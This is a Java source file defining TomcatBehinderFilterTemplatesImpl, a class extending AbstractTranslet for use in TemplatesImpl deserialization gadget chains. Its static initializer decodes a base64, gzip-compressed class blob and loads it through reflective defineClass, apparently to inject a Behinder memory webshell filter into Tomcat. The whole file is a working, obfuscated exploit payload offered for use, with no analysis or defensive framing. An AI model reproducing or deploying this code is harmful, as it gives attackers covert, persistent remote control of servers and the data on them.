package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatBehinderFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
